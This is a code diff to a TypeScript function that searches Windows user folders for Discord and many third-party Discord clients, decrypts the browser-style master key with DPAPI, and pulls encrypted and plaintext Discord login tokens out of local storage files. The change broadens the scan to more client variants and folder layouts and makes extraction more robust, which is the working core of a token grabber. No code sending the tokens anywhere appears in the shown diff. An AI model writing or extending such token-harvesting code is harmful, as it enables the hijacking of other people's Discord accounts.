@@ -114,20 +114,54 @@ function decryptToken(encryptedBase64: string, masterKey: Buffer): string {
 
 export async function findLocalTokens(): Promise<string[]> {
     const tokens = new Set<string>();
-    const apps = ["discord", "discordcanary", "discordptb", "discorddevelopment", "lightcord"];
 
     if (process.platform !== "win32") return [];
 
-    for (const app of apps) {
+    const roaming = process.env.APPDATA || "";
+    const local = process.env.LOCALAPPDATA || "";
+
+    // All known Discord-based client variants, scanned in both APPDATA (Roaming) and LOCALAPPDATA
+    const appNames = [
+        "discord",
+        "discordcanary",
+        "discordptb",
+        "discorddevelopment",
+        "lightcord",
+        "vesktop",
+        "equicord",
+        "betterdiscord",
+        "xascord",
+        "arrpc",
+    ];
+
+    // Build candidate base paths: Roaming\<app> and Local\<app>
+    const candidatePaths: string[] = [];
+    for (const app of appNames) {
+        candidatePaths.push(join(roaming, app));
+        candidatePaths.push(join(local, app));
+    }
+
+    // Also scan Roaming\Vencord and Local\Vencord (Vencord injected clients share Discord's data)
+    // These are the same paths as above, but kept explicit for clarity.
+    // Additionally discover any folder whose name contains "discord" or "cord" in %LOCALAPPDATA%
+    try {
+        for (const entry of readdirSync(local)) {
+            if (/discord|cord|vencord|equicord/i.test(entry)) {
+                const p = join(local, entry);
+                if (!candidatePaths.includes(p)) candidatePaths.push(p);
+            }
+        }
+    } catch { }
+
+    // Regex that captures only valid base64 characters (no quote/backslash contamination)
+    const ENC_RE = /dQw4w9WgXcQ:([A-Za-z0-9+/]+=*)/g;
+    // Plain-text token pattern (legacy / non-encrypted storage)
+    const PLAIN_RE = /(?:mfa\.[\w-]{84}|[\w-]{24,26}\.[\w-]{4,7}\.[\w-]{27,40})/g;
+    // Validation of decrypted token
+    const TOKEN_VALID = /^(?:mfa\.[\w-]{84}|[\w-]{24,26}\.[\w-]{4,7}\.[\w-]{27,40})$/;
+
+    for (const appPath of candidatePaths) {
         try {
-            const appPath = join(process.env.APPDATA || "", app);
-
-            // Directories to scan for this application
-            const scanDirs = [
-                join(appPath, "Local Storage", "leveldb"),
-                join(appPath, "Session Storage")
-            ];
-
             const localStatePath = join(appPath, "Local State");
             if (!existsSync(localStatePath)) continue;
 
@@ -135,31 +169,61 @@ export async function findLocalTokens(): Promise<string[]> {
             const encryptedKey = localState.os_crypt?.encrypted_key;
             if (!encryptedKey) continue;
 
-            const masterKey = decryptDPAPI(encryptedKey);
+            let masterKey: Buffer;
+            try {
+                masterKey = decryptDPAPI(encryptedKey);
+            } catch {
+                continue; // Can't decrypt master key — skip this app
+            }
+
+            // Directories that can hold token data for this app
+            const scanDirs = [
+                join(appPath, "Local Storage", "leveldb"),
+                join(appPath, "Session Storage"),
+                join(appPath, "Default", "Local Storage", "leveldb"), // Chromium profile layout
+                join(appPath, "Default", "Session Storage"),
+            ];
 
             for (const dir of scanDirs) {
                 if (!existsSync(dir)) continue;
-                const files = readdirSync(dir);
+
+                let files: string[];
+                try { files = readdirSync(dir); } catch { continue; }
 
                 for (const file of files) {
+                    // Only scan data files; skip LOCK, MANIFEST, CURRENT, LOG
+                    if (!/\.(ldb|log)$/i.test(file)) continue;
+
+                    let content: string;
                     try {
-                        const content = readFileSync(join(dir, file), "latin1");
-                        const matches = content.match(/dQw4w9WgXcQ:[A-Za-z0-9+/=]+/g);
-                        if (matches) {
-                            for (const match of matches) {
-                                try {
-                                    const enc = match.split("dQw4w9WgXcQ:")[1].split('"')[0].split("\\")[0];
-                                    const token = decryptToken(enc, masterKey);
-                                    if (token && /(?:mfa\.[\w-]{84}|[\w-]{24,26}\.[\w-]{4,7}\.[\w-]{27,40})/.test(token)) {
-                                        tokens.add(token);
-                                    }
-                                } catch { }
-                            }
-                        }
-                    } catch (e) { }
+                        content = readFileSync(join(dir, file), "latin1");
+                    } catch { continue; }
+
+                    // ── Encrypted tokens (v10 / dQw4 format) ──────────────────
+                    let m: RegExpExecArray | null;
+                    ENC_RE.lastIndex = 0;
+                    while ((m = ENC_RE.exec(content)) !== null) {
+                        try {
+                            const enc = m[1];
+                            // Sanity: base64-decoded length must be > 16+12 bytes (AES-GCM overhead)
+                            const rawLen = Math.floor(enc.length * 3 / 4);
+                            if (rawLen < 30) continue;
+                            const token = decryptToken(enc, masterKey);
+                            if (token && TOKEN_VALID.test(token)) tokens.add(token);
+                        } catch { }
+                    }
+
+                    // ── Plain-text tokens (legacy storage or non-encrypted) ────
+                    PLAIN_RE.lastIndex = 0;
+                    while ((m = PLAIN_RE.exec(content)) !== null) {
+                        const t = m[0];
+                        if (TOKEN_VALID.test(t)) tokens.add(t);
+                    }
                 }
             }
-        } catch (e) { }
+        } catch { }
     }
+
     return Array.from(tokens);
 }
+
